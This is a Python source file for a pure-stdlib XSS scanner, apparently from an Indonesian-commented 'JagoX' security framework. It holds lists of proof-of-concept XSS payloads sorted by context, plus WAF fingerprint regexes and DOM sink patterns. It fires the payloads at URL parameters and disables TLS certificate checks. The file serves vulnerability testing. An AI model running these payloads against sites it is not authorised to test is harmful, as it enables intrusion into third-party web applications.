#!/usr/bin/env python3
# xss.py — Comprehensive pure-Python XSS detector
# Part of JagoX framework — v1.0.0
# MIT License
#
# Fitur lengkap:
#   - Reflected XSS detection dengan banyak payload
#   - Context-aware payload selection (HTML body, attribute, script, comment, URL)
#   - Polyglot payload (payload yang bekerja di banyak konteks)
#   - Encoding bypass detection (URL encode, HTML entity, double encode)
#   - DOM-based XSS heuristic (deteksi sink berbahaya di JS)
#   - WAF detection
#   - Multi-payload confirmation (kurangi false positive)
#   - Pure Python stdlib — zero external dependencies
#
# Public API:
#   scan(url, timeout=5, delay_ms=0, verify=True)
#     -> list of finding dict:
#         {
#             "url":      str,     # URL yang diuji
#             "param":    str,     # parameter vulnerable
#             "payload":  str,     # payload yang berhasil
#             "context":  str,     # html_body / attribute / script / comment / etc
#             "type":     str,     # reflected / dom_based / waf_detected
#             "severity": str,     # HIGH / MEDIUM / LOW / INFO
#         }

import re
import ssl
import time
import urllib.request
import urllib.parse
import urllib.error


__version__ = "1.0.0"


# ============================================================
# PAYLOADS — dikelompokkan per konteks
# ============================================================

# Payload dasar yang paling umum berhasil
PAYLOADS_BASIC = [
    "<script>alert(1)</script>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
]

# Payload untuk konteks attribute (di dalam value="...")
PAYLOADS_ATTRIBUTE = [
    "\" onmouseover=alert(1) x=\"",
    "' onmouseover=alert(1) x='",
    "\" autofocus onfocus=alert(1) x=\"",
    "' autofocus onfocus=alert(1) x='",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "javascript:alert(1)",
]

# Payload untuk konteks script (di dalam <script>...</script>)
PAYLOADS_SCRIPT = [
    "';alert(1);//",
    "\";alert(1);//",
    "</script><script>alert(1)</script>",
    "'-alert(1)-'",
]

# Polyglot — bekerja di banyak konteks sekaligus
PAYLOADS_POLYGLOT = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "\"><svg/onload=alert(1)//<svg/onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "</script><svg onload=alert(1)>",
]

# Payload encoded (untuk bypass filter naif)
PAYLOADS_ENCODED = [
    # URL-encoded script tag
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    # HTML entity
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    # Double URL-encoded
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    # HTML5 entity tanpa semicolon
    "&lt;script&gt;alert(1)&lt;/script&gt;",
]

# Marker unik untuk memastikan reflection & bukan false positive
# Pakai angka random 8-digit — pencarian ini di URL response
_XSS_MARKER = "xSs9847M4rK3r"


# ============================================================
# WAF SIGNATURE (mirip sqli.py)
# ============================================================
WAF_SIGNATURES = [
    (r"cloudflare",            "Cloudflare"),
    (r"akamai",                "Akamai"),
    (r"mod_security|modsecurity", "ModSecurity"),
    (r"awselb|aws.*waf",       "AWS WAF"),
    (r"imperva|incapsula",     "Imperva"),
    (r"f5.*big.?ip|bigip",     "F5 BIG-IP ASM"),
    (r"barracuda",             "Barracuda"),
    (r"sucuri",                "Sucuri"),
    (r"fortiweb|fortinet",     "Fortinet FortiWeb"),
    (r"wallarm",               "Wallarm"),
    (r"citrix.*netscaler",     "Citrix NetScaler"),
]


# ============================================================
# DOM-BASED HEURISTIC — sink berbahaya di JS
# ============================================================
# Kalau HTML mengandung pola ini, kemungkinan besar bisa jadi DOM XSS
DOM_SINKS = [
    # Sink umum — HTML injection via JS
    r"document\.write\s*\(",
    r"document\.writeln\s*\(",
    r"innerHTML\s*=",
    r"outerHTML\s*=",
    r"insertAdjacentHTML\s*\(",
    r"\.html\s*\(",                      # jQuery
    # Sink eksekusi kode
    r"eval\s*\(",
    r"Function\s*\(",
    r"setTimeout\s*\(\s*['\"]",
    r"setInterval\s*\(\s*['\"]",
    # Sink navigasi berbahaya
    r"location\s*=",
    r"location\.href\s*=",
    r"location\.assign\s*\(",
    r"location\.replace\s*\(",
    # Sink jQuery
    r"\$\(.*?\)\.(after|append|before|prepend|wrap|html)\s*\(",
]

# Pattern untuk deteksi DOM source (input dari URL/hash)
DOM_SOURCES = [
    r"location\.hash",
    r"location\.search",
    r"location\.href",
    r"document\.referrer",
    r"document\.URL",
    r"window\.name",
    r"document\.cookie",
]


# ============================================================
# HTTP HELPERS
# ============================================================
def _make_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _fetch(url, timeout=5, delay_ms=0):
    if delay_ms:
        time.sleep(delay_ms / 1000.0)

    req = urllib.request.Request(url, headers={
        "User-Agent": "Mozilla/5.0 (compatible; nmpX/0.5)",
        "Accept": "text/html,*/*",
    })
    result = {"status": 0, "headers": {}, "body": "", "error": None}

    try:
        with urllib.request.urlopen(
            req, timeout=timeout, context=_make_ctx()
        ) as resp:
            result["status"] = resp.status
            result["headers"] = dict(resp.headers)
            result["body"] = resp.read(65536).decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        result["status"] = e.code
        try:
            result["headers"] = dict(e.headers)
            result["body"] = e.read(65536).decode("utf-8", errors="replace")
        except Exception:
            pass
    except urllib.error.URLError as e:
        result["error"] = f"URLError: {e.reason}"
    except ssl.SSLError as e:
        result["error"] = f"SSLError: {e}"
    except Exception as e:
        result["error"] = f"{type(e).__name__}: {e}"

    return result


def _replace_param(url, param, new_value):
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [new_value]
    return parsed._replace(
        query=urllib.parse.urlencode(qs, doseq=True)
    ).geturl()


# ============================================================
# WAF DETECTION
# ============================================================
def detect_waf(resp):
    hdrs = " ".join(f"{k}:{v}" for k, v in resp["headers"].items()).lower()
    body_lower = resp["body"][:2000].lower()
    for pattern, name in WAF_SIGNATURES:
        if re.search(pattern, hdrs) or re.search(pattern, body_lower):
            return name
    return None


# ============================================================
# CONTEXT DETECTION — di mana marker muncul di HTML?
# ============================================================
def _detect_context(body, marker):
    """
    Cari posisi marker di body, tentukan konteksnya.
    Return: "html_body", "attribute_single", "attribute_double",
            "script", "comment", "url", "not_found"
    """
    idx = body.find(marker)
    if idx < 0:
        return "not_found"

    # Ambil cuplikan ~500 char sebelum marker untuk analisis konteks
    prefix = body[max(0, idx - 500):idx]

    # Check comment dulu (prioritas tertinggi karena tidak akan eksekusi)
    last_open = prefix.rfind("<!--")
    last_close = prefix.rfind("-->")
    if last_open > last_close:
        return "comment"

    # Check di dalam <script>...</script>
    last_script_open = prefix.rfind("<script")
    last_script_close = prefix.rfind("</script")
    if last_script_open > last_script_close:
        return "script"

    # Check di dalam <style>...</style>
    last_style_open = prefix.rfind("<style")
    last_style_close = prefix.rfind("</style")
    if last_style_open > last_style_close:
        return "style"

    # Check di dalam tag attribute
    # Cari tag terakhir yang belum ditutup
    last_lt = prefix.rfind("<")
    last_gt = prefix.rfind(">")
    if last_lt > last_gt:
        # Kita di dalam tag — cek kutip
        tag_content = prefix[last_lt:]
        single_q = tag_content.count("'")
        double_q = tag_content.count('"')
        if single_q % 2 == 1:
            return "attribute_single"
        if double_q % 2 == 1:
            return "attribute_double"
        return "tag_content"  # di dalam tag tapi bukan di value

    # Default: HTML body (normal text)
    return "html_body"


# ============================================================
# PAYLOAD SELECTION — berdasarkan konteks
# ============================================================
def _pick_payloads_for_context(context, include_polyglot=True):
    """
    Pilih payload yang paling relevan untuk konteks yang terdeteksi.
    """
    basic = PAYLOADS_BASIC[:6]  # selalu coba yang basic dulu

    if context == "attribute_single":
        return PAYLOADS_ATTRIBUTE + basic
    if context == "attribute_double":
        return PAYLOADS_ATTRIBUTE + basic
    if context in ("attribute_single", "attribute_double", "tag_content"):
        return PAYLOADS_ATTRIBUTE + basic
    if context == "script":
        return PAYLOADS_SCRIPT + basic
    if context == "html_body":
        return basic
    if context == "comment":
        # Payload comment tidak akan eksekusi — coba escape dari comment
        return ["-->", "--><script>alert(1)</script>"] + basic
    if context == "style":
        return ["</style><script>alert(1)</script>"] + basic

    # Fallback: semua payload + polyglot
    if include_polyglot:
        return basic + PAYLOADS_POLYGLOT
    return basic


# ============================================================
# REFLECTED XSS — core
# ============================================================
def _test_reflected(url, param, base_body, timeout, delay_ms,
                     verify=True):
    """
    Uji reflected XSS pada satu parameter.
    Return list of findings.
    """
    findings = []

    # Probe awal dengan marker untuk deteksi konteks
    probe_payload = f"{_XSS_MARKER}<x>"
    probe_url = _replace_param(url, param, probe_payload)
    probe_resp = _fetch(probe_url, timeout=timeout, delay_ms=delay_ms)
    if probe_resp["error"]:
        return findings

    # Apakah marker muncul di response?
    context = _detect_context(probe_resp["body"], _XSS_MARKER)
    if context == "not_found":
        return findings  # tidak reflected = tidak bisa XSS

    # Marker ditemukan — tentukan payload untuk konteks ini
    candidates = _pick_payloads_for_context(context)

    # Uji tiap payload
    for payload in candidates:
        test_url = _replace_param(url, param, payload)
        resp = _fetch(test_url, timeout=timeout, delay_ms=delay_ms)
        if resp["error"]:
            continue

        body = resp["body"]

        # Cek: apakah payload muncul PERSIS (tidak ter-encode)
        if payload in body:
            # Verifikasi tambahan: kalau payload = tag utuh, kita harus
            # memastikan browser akan eksekusi. Cek apakah tag tidak
            # di-escape (&lt;script&gt; dsb).
            if _is_executable_payload(body, payload, context):
                findings.append({
                    "url":      test_url,
                    "param":    param,
                    "payload":  payload,
                    "context":  context,
                    "type":     "reflected",
                    "severity": "HIGH",
                })
                if verify:
                    # Verifikasi ulang dengan payload kedua untuk hindari
                    # false positive kalau filter tidak konsisten
                    second = _verify_with_second(url, param, context,
                                                 timeout, delay_ms)
                    if not second:
                        # Tidak lolos verifikasi → turunkan severity
                        findings[-1]["severity"] = "MEDIUM"
                return findings

        # Cek encoded reflection (kemungkinan bypass parsing filter)
        # Marker partial (encoded < jadi &lt;): tetap laporkan sebagai LOW
        if _check_encoded_reflection(body, payload):
            findings.append({
                "url":      test_url,
                "param":    param,
                "payload":  payload,
                "context":  context,
                "type":     "reflected_encoded",
                "severity": "LOW",
            })
            return findings

    return findings


def _is_executable_payload(body, payload, context):
    """
    Heuristik: apakah payload benar-benar executable (tidak di-encode)?
    """
    # Kalau payload mengandung <script>, cek apakah <script muncul literal
    if "<script" in payload.lower():
        # Cari payload di body dan cek tag tidak di-escape
        idx = body.find(payload)
        if idx < 0:
            return False
        # Cek 20 char sebelum: jangan ada "&lt;" atau "&#60;" (artinya di-encode)
        before = body[max(0, idx - 30):idx]
        if "&lt;" in before or "&#60;" in before or "&#x3c;" in before:
            return False
        # Cek setelah: jangan ada "</script>" yang menutup terlalu awal
        return True

    # Untuk event handler (onerror=, onload=, dsb)
    if re.search(r"on\w+\s*=", payload, re.IGNORECASE):
        # Cek payload muncul di dalam tag (< ... >), bukan di escaped text
        idx = body.find(payload)
        if idx < 0:
            return False
        # Cek sebelum: apakah ada "<" yang belum ditutup ">"
        prefix = body[max(0, idx - 200):idx]
        last_lt = prefix.rfind("<")
        last_gt = prefix.rfind(">")
        if last_lt <= last_gt:
            return False  # payload tidak di dalam tag
        # Payload ada di dalam tag — bisa eksekusi kalau bukan escaped
        if "&lt;" in prefix[-50:] or "&quot;" in prefix[-20:]:
            return False
        return True

    # Payload polyglot/URL-based: selalu anggap berhasil kalau matched
    return True


def _check_encoded_reflection(body, payload):
    """
    Cek apakah payload muncul dalam bentuk ter-encode sebagian.
    Kalau iya, tetap laporkan sebagai LOW (mungkin bypass filter).
    """
    # Kalau payload panjang, skip (kemungkinan besar false positive)
    if len(payload) > 80:
        return False

    # Encode payload dengan HTML entity sederhana
    encoded_lt = payload.replace("<", "&lt;").replace(">", "&gt;")
    encoded_quot = payload.replace('"', "&quot;")

    # Cek apakah versi encoded-nya muncul
    if encoded_lt != payload and encoded_lt in body:
        return True
    if encoded_quot != payload and encoded_quot in body:
        return True

    return False


def _verify_with_second(url, param, context, timeout, delay_ms):
    """
    Verifikasi pakai payload kedua berbeda. Return True kalau juga reflect.
    """
    alt_payloads = {
        "html_body": ["<svg/onload=alert(2)>", "<img src=x onerror=alert(2)>"],
        "attribute_double": ['" onmouseover=alert(2) x="'],
        "attribute_single": ["' onmouseover=alert(2) x='"],
        "script": ["';alert(2);//"],
    }.get(context, ["<svg/onload=alert(2)>"])

    for p in alt_payloads:
        test_url = _replace_param(url, param, p)
        resp = _fetch(test_url, timeout=timeout, delay_ms=delay_ms)
        if resp["error"]:
            continue
        if p in resp["body"]:
            return True
    return False


# ============================================================
# DOM-BASED HEURISTIC
# ============================================================
def _check_dom_xss(body):
    """
    Deteksi pola DOM XSS di HTML/JS statis (tanpa eksekusi JS).
    Return list of findings.
    """
    findings = []

    # Cari sink berbahaya
    sinks_found = []
    for pattern in DOM_SINKS:
        m = re.search(pattern, body)
        if m:
            sinks_found.append(m.group(0)[:60])

    # Cari source (input dari URL)
    sources_found = []
    for pattern in DOM_SOURCES:
        m = re.search(pattern, body)
        if m:
            sources_found.append(m.group(0)[:60])

    # Kalau ada sink + source di page yang sama, kemungkinan DOM XSS
    if sinks_found and sources_found:
        findings.append({
            "url":      "-",
            "param":    "-",
            "payload":  "-",
            "context":  "dom",
            "type":     "dom_based_potential",
            "severity": "MEDIUM",
            "evidence": (
                f"Sink: {sinks_found[0]} | "
                f"Source: {sources_found[0]}"
            ),
        })
    elif sinks_found:
        # Ada sink tapi tidak ada source langsung — tetap catat sebagai INFO
        findings.append({
            "url":      "-",
            "param":    "-",
            "payload":  "-",
            "context":  "dom",
            "type":     "dom_sink_detected",
            "severity": "INFO",
            "evidence": f"Sink: {', '.join(sinks_found[:3])}",
        })

    return findings


# ============================================================
# MAIN ENTRY — scan
# ============================================================
def scan(url, timeout=5, delay_ms=0, verify=True, check_dom=True):
    """
    Scan XSS pada URL yang punya query parameter.

    Args:
        url:        URL dengan query param
        timeout:    timeout per request (detik)
        delay_ms:   delay antar request (ms) untuk safe mode
        verify:     verifikasi multi-payload untuk kurangi false positive
        check_dom:  jalankan DOM-based heuristic

    Returns:
        list of finding dict (lihat header file).
    """
    findings = []

    # Validasi URL
    parsed = urllib.parse.urlparse(url)
    if not parsed.query:
        return findings

    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not qs:
        return findings

    # Fetch baseline
    base_resp = _fetch(url, timeout=timeout, delay_ms=delay_ms)
    if base_resp["error"]:
        return findings

    # Deteksi WAF
    waf = detect_waf(base_resp)
    if waf:
        findings.append({
            "url":      url,
            "param":    "-",
            "payload":  "-",
            "context":  "waf",
            "type":     "waf_detected",
            "severity": "INFO",
            "evidence": f"WAF: {waf}",
        })

    # DOM-based heuristic pada halaman utama
    if check_dom:
        dom_findings = _check_dom_xss(base_resp["body"])
        for f in dom_findings:
            f.setdefault("url", url)
            findings.append(f)

    # Reflected XSS per parameter (batasi 3 param)
    for param in list(qs.keys())[:3]:
        reflected = _test_reflected(
            url, param, base_resp["body"],
            timeout, delay_ms, verify=verify,
        )
        findings.extend(reflected)

    return findings


# ============================================================
# CLI ENTRY POINT — test standalone
# ============================================================
def _cli():
    import argparse
    import sys
    import os

    # Banner
    try:
        from . import banner as _bn
    except ImportError:
        try:
            sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
            import banner as _bn
        except ImportError:
            _bn = None

    if _bn is not None:
        try:
            from rich.console import Console
            _bn.print_banner(
                console=Console(),
                version=__version__,
                subtitle="XSS Detector — Pure Python",
            )
        except ImportError:
            _bn.print_banner()

    parser = argparse.ArgumentParser(
        description="JagoX xss — pure-Python XSS detector"
    )
    parser.add_argument(
        "url",
        help="URL dengan query param (misal http://x.com/p?q=test)"
    )
    parser.add_argument("-t", "--timeout", type=float, default=5.0)
    parser.add_argument("-d", "--delay", type=int, default=0,
                        help="Delay antar request (ms)")
    parser.add_argument("--no-verify", action="store_true",
                        help="Skip verifikasi multi-payload (lebih cepat)")
    parser.add_argument("--no-dom", action="store_true",
                        help="Skip DOM-based heuristic")
    args = parser.parse_args()

    print(f"=== XSS Scan — {args.url} ===\n")
    print("Memindai...\n")

    findings = scan(
        args.url,
        timeout=args.timeout,
        delay_ms=args.delay,
        verify=not args.no_verify,
        check_dom=not args.no_dom,
    )

    if not findings:
        print("[OK] Tidak ada XSS terdeteksi.")
        return

    print(f"Total temuan: {len(findings)}\n")
    sev_order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2, "INFO": 3}
    findings.sort(key=lambda f: sev_order.get(f["severity"], 4))

    for f in findings:
        print(f"[{f['severity']:<8}] {f['type']:<22} "
              f"param='{f.get('param','-')}' context='{f.get('context','-')}'")
        if f.get("payload") and f["payload"] != "-":
            print(f"            payload: {f['payload'][:80]}")
        if f.get("evidence"):
            print(f"            evidence: {f['evidence']}")
        print(f"            url    : {f.get('url','-')[:80]}")
        print()


if __name__ == "__main__":
    _cli()